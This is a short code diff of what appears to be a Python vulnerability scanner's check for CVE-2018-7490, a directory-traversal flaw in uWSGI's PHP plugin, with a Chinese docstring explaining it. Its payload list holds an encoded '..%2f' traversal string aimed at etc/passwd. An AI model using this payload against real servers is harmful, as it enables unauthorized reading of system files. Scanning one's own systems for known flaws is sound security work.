@@ -7,7 +7,7 @@ cve_2018_7490_payloads = [
     {'path': '..%2f..%2f..%2f..%2f..%2fetc/passwd'},
 ]
 
-def cve_2018_7490_scan(self, clients):
+def cve_2018_7490_scan(clients):
     ''' uWSGI 2.0.17之前的PHP插件
             没有正确的处理DOCUMENT_ROOT检测
             导致用户可以通过..%2f来跨越目录, 读取或运行DOCUMENT_ROOT目录以外的文件
@@ -15,7 +15,7 @@ def cve_2018_7490_scan(self, clients):
     client = clients.get('reqClient')
     
     vul_info = {
-        'app_name': self.app_name,
+        'app_name': 'uWSGI-PHP',
         'vul_type': 'FileRead',
         'vul_id': 'CVE-2018-7490',
     }
